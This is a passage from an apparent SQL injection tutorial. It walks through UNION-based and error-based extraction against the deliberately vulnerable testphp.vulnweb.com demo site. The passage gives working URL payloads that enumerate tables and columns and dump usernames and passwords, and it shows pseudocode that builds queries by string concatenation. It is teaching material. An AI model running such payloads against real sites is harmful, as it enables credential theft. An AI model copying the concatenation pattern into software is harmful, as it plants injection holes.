+Even though helper function’s syntax or names will vary database to database, there is always a functionality doing
+the same thing with for different database.
+<br /></p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="n">MariaDB</span> <span class="p">[</span><span class="n">testdb</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="k">table_name</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">WHERE</span> <span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">();</span>
+<span class="o">+</span><span class="c1">------------+</span>
+<span class="o">|</span> <span class="k">table_name</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">------------+</span>
+<span class="o">|</span> <span class="n">users</span>      <span class="o">|</span>
+<span class="o">+</span><span class="c1">------------+</span></code></pre></figure>
+
+<p>With <code class="language-plaintext highlighter-rouge">tables</code> method belongs to <code class="language-plaintext highlighter-rouge">information_schema</code>, we can query the table names.<br />
+Now lets imply this method to the acuart database.
+<br />
+<a href="http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,table_name,8,9,10,11 FROM information_schema.tables WHERE table_schema=database()">http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,table_name,8,9,10,11 FROM information_schema.tables WHERE table_schema=database()</a>
+<img src="/assets/img/posts/fundamentals-of-sql-injection/sql12.jpg" alt="Desktop View" />
+<br />
+Awesome, we got all the table names storing in the acurat db.</p>
+<h3 id="extracting-the-column-names">Extracting the column names</h3>
+<p>Just like <code class="language-plaintext highlighter-rouge">tables</code>, there is also <code class="language-plaintext highlighter-rouge">columns</code> method belongs to <code class="language-plaintext highlighter-rouge">information_schema</code>.However, to use that target-spesific, first
+we needed to see table names. Otherwise it will bring all the columns exists in the database, such a mess.</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="n">MariaDB</span> <span class="p">[</span><span class="n">testdb</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="k">column_name</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">WHERE</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'users'</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">---------------------+</span>
+<span class="o">|</span> <span class="k">column_name</span>         <span class="o">|</span>
+<span class="o">+</span><span class="c1">---------------------+</span>
+<span class="o">|</span> <span class="n">PersonID</span>            <span class="o">|</span>
+<span class="o">|</span> <span class="n">LastName</span>            <span class="o">|</span>
+<span class="o">|</span> <span class="n">FirstName</span>           <span class="o">|</span>
+<span class="o">|</span> <span class="n">PersonID</span>            <span class="o">|</span>
+<span class="o">|</span> <span class="n">FirstName</span>           <span class="o">|</span>
+<span class="o">|</span> <span class="n">LastName</span>            <span class="o">|</span>
+<span class="o">|</span> <span class="k">USER</span>                <span class="o">|</span>
+<span class="o">|</span> <span class="n">CURRENT_CONNECTIONS</span> <span class="o">|</span>
+<span class="o">|</span> <span class="n">TOTAL_CONNECTIONS</span>   <span class="o">|</span>
+<span class="o">+</span><span class="c1">---------------------+</span></code></pre></figure>
+
+<p>Now lets imply this method to the acuart database. 
+<br />
+<a href="http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,column_name,8,9,10,11 FROM information_schema.columns WHERE table_name=&quot;users&quot;">http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,column_name,8,9,10,11 FROM information_schema.columns WHERE table_name="users"</a>
+<img src="/assets/img/posts/fundamentals-of-sql-injection/sql13.jpg" alt="Desktop View" />
+<br />
+We now have got all the column names in the ‘users’ table, ‘uname’ and ‘pass’ columns are intresting : )
+<br /></p>
+<h3 id="extracting-values-from-columns">Extracting values from columns</h3>
+<p>After this point, our aim is certain, and simple. We need to get ‘uname’ and ‘pass’ fields in users table.
+One simple query to get those values, for example just like this.</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="n">MariaDB</span> <span class="p">[</span><span class="n">testdb</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="n">FirstName</span> <span class="k">from</span> <span class="n">users</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">-----------+</span>
+<span class="o">|</span> <span class="n">FirstName</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">-----------+</span>
+<span class="o">|</span> <span class="n">Burak</span>     <span class="o">|</span>
+<span class="o">|</span> <span class="n">Burak2</span>    <span class="o">|</span>
+<span class="o">|</span> <span class="n">Burak3</span>    <span class="o">|</span>
+<span class="o">+</span><span class="c1">-----------+</span></code></pre></figure>
+
+<p>So lets imply this to acuart.
+<br />
+<a href="http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,concat(&quot;Username:&quot;,uname, &quot; Password:&quot;,pass),8,9,10,11 FROM users">http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,concat("Username:",uname, " Password:",pass),8,9,10,11 FROM users</a>
+<img src="/assets/img/posts/fundamentals-of-sql-injection/sql14.jpg" alt="Desktop View" />
+<strong>Congrats !!</strong> we got the username and password fields.</p>
+<h3 id="concat-method">Concat method</h3>
+<p>As you see above, I used concat for string formatting.Lets see how it is working from our example database.</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="n">MariaDB</span> <span class="p">[</span><span class="n">testdb</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="n">concat</span><span class="p">(</span><span class="nv">"FN:"</span><span class="p">,</span><span class="n">FirstName</span><span class="p">,</span> <span class="nv">"  LN:"</span><span class="p">,</span><span class="n">LastName</span><span class="p">)</span> <span class="k">from</span> <span class="n">users</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">-------------------------------------------+</span>
+<span class="o">|</span> <span class="n">concat</span><span class="p">(</span><span class="nv">"FN:"</span><span class="p">,</span><span class="n">FirstName</span><span class="p">,</span> <span class="nv">"  LN:"</span><span class="p">,</span><span class="n">LastName</span><span class="p">)</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">-------------------------------------------+</span>
+<span class="o">|</span> <span class="n">FN</span><span class="p">:</span><span class="n">Burak</span>  <span class="n">LN</span><span class="p">:</span><span class="n">Baris</span>                        <span class="o">|</span>
+<span class="o">|</span> <span class="n">FN</span><span class="p">:</span><span class="n">Burak2</span>  <span class="n">LN</span><span class="p">:</span><span class="n">Baris2</span>                      <span class="o">|</span>
+<span class="o">|</span> <span class="n">FN</span><span class="p">:</span><span class="n">Burak3</span>  <span class="n">LN</span><span class="p">:</span><span class="n">Baris3</span>                      <span class="o">|</span>
+<span class="o">+</span><span class="c1">-------------------------------------------+</span></code></pre></figure>
+
+<h3 id="guess-correction">Guess correction</h3>
+<p>As you remember, at the <code class="language-plaintext highlighter-rouge">Guessing the design</code> heading, we come up with a possible query that runs at the server
+just by observing the behaviour of the web application. After doing more scans in the database, I see that, that guess
+we made above, is kind of close to the real design.</p>
+
+<p><a href="http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,pshort,3,4,5,6,title,img,(SELECT aname FROM artists WHERE artist_id=1),10,(SELECT cname FROM categ WHERE cat_id=1) FROM pictures WHERE cat_id=1">http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,pshort,3,4,5,6,title,img,(SELECT aname FROM artists WHERE artist_id=1),10,(SELECT cname FROM categ WHERE cat_id=1) FROM pictures WHERE cat_id=1</a>
+<br />
+Gives the same result as:
+<br />
+<a href="http://testphp.vulnweb.com/listproducts.php?cat=1">http://testphp.vulnweb.com/listproducts.php?cat=1</a></p>
+
+<h2 id="vulnweb---error-based-sqli">VULNWEB - ERROR BASED SQLi</h2>
+
+<p>As you remember, this is the pseudo code for testphp.vulnweb website.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="nb">id</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'id'</span><span class="p">)</span>
+<span class="n">query</span><span class="o">=</span><span class="s">"SELECT (some unknown column names) FROM listproducts WHERE cat="</span><span class="o">+</span><span class="nb">id</span>
+<span class="c1">#Try:
+</span><span class="n">result</span> <span class="o">=</span> <span class="n">db</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
+<span class="c1">#Except:
+</span>    <span class="c1">#pass
+</span>
+<span class="k">if</span> <span class="n">result</span><span class="p">.</span><span class="n">size</span><span class="p">()</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">title</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">img</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">description</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">author</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="k">pass</span></code></pre></figure>
+
+<p>I have added those comment lines intentionally.If we had those <code class="language-plaintext highlighter-rouge">Try</code> and <code class="language-plaintext highlighter-rouge">Except</code> lines, or any other exception handling method
+with another language that is used in the server side code, we could not have see this error message.
+<img src="/assets/img/posts/fundamentals-of-sql-injection/15.jpg" alt="Desktop View" />
+<br />
+Spesifically speaking for the pseudo code above, when <code class="language-plaintext highlighter-rouge">execute(query)</code> method returns a result to the <code class="language-plaintext highlighter-rouge">result</code> variable from database. <code class="language-plaintext highlighter-rouge">if result.size()&gt;0</code> means that, if we have returned something from query, print it,
+it can be both the intented and expected query result, or in this case an error message. If we had an exception handling, result
+variable would not be declared at all if the query result is not accurate.
+<br />
+This is a <strong>catastrophic mis-coding</strong> for the server, because we can use this error message to extract data from it.
+<br /></p>
+<h3 id="extract-value-method">Extract value method</h3>
+
+<p>As in the example, database return the unexpected string in error message. That means that, we see what we give in the input
+field.Instead of seeing what we give as a string, it is possible that to return values from database.<br />
+There is a helper function that we can use, which is <code class="language-plaintext highlighter-rouge">ExtractValue()</code>.</p>
+
+<p><a href="http://testphp.vulnweb.com/listproducts.php?cat=extractvalue(rand(),concat(1,database()))">http://testphp.vulnweb.com/listproducts.php?cat=extractvalue(rand(),concat(1,database()))</a>
+<br />
+Query will look like this on the server side.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">SELECT</span> <span class="p">(</span><span class="n">some</span> <span class="n">unknown</span> <span class="n">column</span> <span class="n">names</span><span class="p">)</span> <span class="n">FROM</span> <span class="n">listproducts</span> <span class="n">WHERE</span> <span class="n">cat</span><span class="o">=</span><span class="n">extractvalue</span><span class="p">(</span><span class="n">rand</span><span class="p">(),</span><span class="n">concat</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">database</span><span class="p">()))</span></code></pre></figure>
+
+<p><br />
+<img src="/assets/img/posts/fundamentals-of-sql-injection/sql16.jpg" alt="Desktop View" />
+<br />
+This time we have returned a function result as an error message and modified the function as we wanted.
+<br />
+As you can see from the picure, result of the <code class="language-plaintext highlighter-rouge">database()</code> helper function <strong>acuart</strong> is in the error message.</p>
+<h3 id="extract-value-with-subquery">Extract value with subquery</h3>
+<p>Instead of passing <code class="language-plaintext highlighter-rouge">database()</code> function as a second argument for <code class="language-plaintext highlighter-rouge">ExtractValue()</code> method, creating subquery with <code class="language-plaintext highlighter-rouge">()</code> will
+allow you to write your own queries.
+<br />
+<strong>I am assuming that you read the previous chapters and got the table names already for this example.</strong>
+<br />
+<a href="http://testphp.vulnweb.com/listproducts.php?cat=extractvalue(rand(),concat(1,(SELECT concat(%22Username: %22,uname,%22  Password:%22,pass) FROM users)))">http://testphp.vulnweb.com/listproducts.php?cat=extractvalue(rand(),concat(1,(SELECT concat(%22Username: %22,uname,%22  Password:%22,pass) FROM users)))</a>
+<br />
+<img src="/assets/img/posts/fundamentals-of-sql-injection/sql17.jpg" alt="Desktop View" />
+<br /></p>
+
+<h2 id="1-and-11--and-1--or-11-">(1’ and 1=1 #) AND (1 ‘ or 1=1 #)</h2>
+
+<p>We have figured out the existence of the SQLi with <strong>2-1</strong>.However this due to the fact that, the code at the backend is
+written in this syntax:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">query</span><span class="o">=</span><span class="s">"SELECT * FROM news WHERE id ="</span><span class="o">+</span><span class="nb">id</span></code></pre></figure>
+
+<p>When we make a request to the <code class="language-plaintext highlighter-rouge">www.xyz.com/?id=2-1</code>, the server side code interpret and runs query like this:</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">news</span> <span class="k">WHERE</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">2</span><span class="o">-</span><span class="mi">1</span>
+<span class="c1">--Which returns</span>
+<span class="o">+</span><span class="c1">-----+</span>
+<span class="o">|</span> <span class="mi">2</span><span class="o">-</span><span class="mi">1</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">-----+</span>
+<span class="o">|</span>   <span class="mi">1</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">-----+</span></code></pre></figure>
+
+<p>However the code could have  written like this either:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="nb">id</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'id'</span><span class="p">)</span>
+<span class="n">query</span><span class="o">=</span><span class="s">"SELECT (some unknown column names) FROM listproducts WHERE cat ='"</span> <span class="o">+</span> <span class="nb">id</span> <span class="o">+</span> <span class="s">"'"</span>
+<span class="c1">#OR
+</span><span class="nb">id</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'id'</span><span class="p">)</span>
+<span class="n">query</span><span class="o">=</span><span class="sa">f</span><span class="s">"SELECT (some unknown column names) FROM listproducts WHERE cat  ='</span><span class="si">{</span><span class="nb">id</span><span class="si">}</span><span class="s">'"</span></code></pre></figure>
+
+<p>When this is the case, if you pass <strong>2-1</strong> to the parameter and make the same <code class="language-plaintext highlighter-rouge">www.xyz.com/?id=2-1</code> request,
+the query would interpreted like the following, because string formatting is different in this case. As 
+we discussed, both <code class="language-plaintext highlighter-rouge">'1'</code> and <code class="language-plaintext highlighter-rouge">1</code> parameters passed to the query will return the same result but <code class="language-plaintext highlighter-rouge">'2-1'</code> will not.</p>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">news</span> <span class="k">WHERE</span> <span class="n">id</span> <span class="o">=</span> <span class="s1">'2-1'</span>
+<span class="c1">--Which returns</span>
+<span class="o">+</span><span class="c1">-----+</span>
+<span class="o">|</span> <span class="mi">2</span><span class="o">-</span><span class="mi">1</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">-----+</span>
+<span class="o">|</span> <span class="mi">2</span><span class="o">-</span><span class="mi">1</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">-----+</span></code></pre></figure>
+
+<p>When this is the case, we need to escape those single quotes which are surrounding the parameter in order to make our own operations
+on the database. 
+<br />
+This is where we need to use those <code class="language-plaintext highlighter-rouge">'or 1=1 #</code> or <code class="language-plaintext highlighter-rouge">'and 1=1 #</code>.</p>
+
+<p><strong>Let me remind you the discipline we should follow</strong>
+<br />
+1-Declare a reference point
+<br />
+2-Try to get back there with an unexpected behavior
+<br />
+Lets use <code class="language-plaintext highlighter-rouge">' and 1=1 #</code> to make the request like this <code class="language-plaintext highlighter-rouge">www.xyz.com/?id=1' and1=1 #</code>.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">query</span><span class="o">=</span><span class="sa">f</span><span class="s">"SELECT * FROM news WHERE id ='</span><span class="si">{</span><span class="mi">1</span><span class="s">' and 1=1 #</span><span class="si">}</span><span class="s">'"</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="o">-</span> <span class="k">FROM</span> <span class="k">new</span> <span class="k">WHERE</span> <span class="n">id</span> <span class="o">=</span> <span class="s1">'1'</span> <span class="k">and</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span></code></pre></figure>
+
+<p>This will bring entries which have id of <strong>1</strong>, and means that web application vulnerable to SQLi, from now on you can do everything same as before
+to extract data the database.</p>
+
+<h2 id="vulnweb---blind-sqli">VULNWEB - BLIND SQLi</h2>
+
+<p>As you remember this was the pseudo code for testphp.vulnweb.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="nb">id</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'id'</span><span class="p">)</span>
+<span class="n">query</span><span class="o">=</span><span class="s">"SELECT (some unknown column names) FROM listproducts WHERE cat="</span><span class="o">+</span><span class="nb">id</span>
+<span class="n">result</span> <span class="o">=</span> <span class="n">db</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">result</span><span class="p">.</span><span class="n">size</span><span class="p">()</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">title</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">img</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">description</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">author</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="k">pass</span></code></pre></figure>
+
+<p>Lets make some changes to think what would have happened if source code for testphp.vulnweb would be like following.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="nb">id</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'id'</span><span class="p">)</span>
+<span class="n">query</span><span class="o">=</span><span class="s">"SELECT (some unknown column names) FROM listproducts WHERE cat="</span><span class="o">+</span><span class="nb">id</span>
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">db</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
+<span class="k">except</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"Error !!!"</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">result</span><span class="p">.</span><span class="n">size</span><span class="p">()</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">:</span>
+    <span class="c1">#for i in result:
+</span>    <span class="c1">#    print(i.title)
+</span>    <span class="c1">#    print(i.img)
+</span>    <span class="c1">#    print(i.description)
+</span>    <span class="c1">#    print(i.author)
+</span>    <span class="k">print</span><span class="p">(</span><span class="s">"Query succesfull !"</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="k">pass</span></code></pre></figure>
+
+<p>If this was the case, we could not see any result of the query on the screen, neither
+images nor titles etc. Also can not perform error based sqli due to exception handling added.How we can extract any data, even make sure there is a sql injection vulnerability when our eyes are blind ?
+<br />
+<br />
+<br />
+To be continued</p>
+:ET
